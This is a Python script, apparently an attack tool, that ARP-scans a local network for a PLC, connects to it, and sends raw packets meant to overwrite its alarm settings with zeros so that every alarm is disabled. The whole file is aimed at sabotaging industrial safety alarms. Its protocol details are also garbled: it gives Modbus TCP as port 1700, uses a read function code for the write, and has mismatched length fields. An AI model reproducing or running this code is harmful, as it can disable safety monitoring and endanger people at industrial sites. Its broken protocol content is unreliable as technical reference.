import scapy.all as scapy
import socket
import struct

# Define the PLC's IP address (will be discovered later)
plc_ip = None

# Define the PLC's port (e.g., Modbus TCP port 1700)
plc_port = 1700

# Define the timeout for the ARP scan
arp_timeout = 2

# Perform ARP scan to discover the PLC's IP address
def discover_plc_ip():
    global plc_ip
    arp_request = scapy.ARP(pdst="192.168.1.0/24")  # Replace with the subnet of your network
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=arp_timeout, verbose=False)[0]
    for element in answered_list:
        if element[1].psrc == "192.168.1.100":  # Replace with the expected IP address of the PLC
            plc_ip = element[1].psrc
            break

# Connect to the PLC and modify the alarm settings
def modify_alarm_settings():
    global plc_ip
    if plc_ip is None:
        print("PLC IP address not found.")
        return

    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the PLC
    sock.connect((plc_ip, plc_port))

    # Send a request to the PLC to read the alarm settings
    # The request format may vary depending on the PLC's protocol (e.g., Modbus, BACnet, etc.)
    # For example, for Modbus TCP, the request to read the alarm settings could be:
    # 0x00 0x00 0x00 0x00 0x00 0x06 0x01 0x01 0x00 0x00 0x00 0x05
    read_request = b"\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x05"
    sock.send(read_request)

    # Receive the response from the PLC
    response = sock.recv(1024)

    # Parse the response to extract the alarm settings
    # The parsing logic may vary depending on the PLC's protocol and response format
    alarm_settings = response[10:]

    # Modify the alarm settings
    # For example, disable all alarms
    alarm_settings = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    # Send a request to the PLC to write the modified alarm settings
    # The request format may vary depending on the PLC's protocol (e.g., Modbus, BACnet, etc.)
    # For example, for Modbus TCP, the request to write the alarm settings could be:
    # 0x00 0x00 0x00 0x00 0x00 0x06 0x01 0x01 0x00 0x00 0x00 0x06
    write_request = b"\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x06" + alarm_settings
    sock.send(write_request)

    # Receive the response from the PLC
    response = sock.recv(1024)

    # Check if the write was successful
    if response == b"\x00\x00\x00\x00\x00\x06\x01\x01\x00\x00\x00\x06":
        print("Alarm setting modification successful.")
    else:
        print("Alarm setting modification failed.")

    # Close the socket
    sock.close()

# Call the functions
discover_plc_ip()
modify_alarm_settings()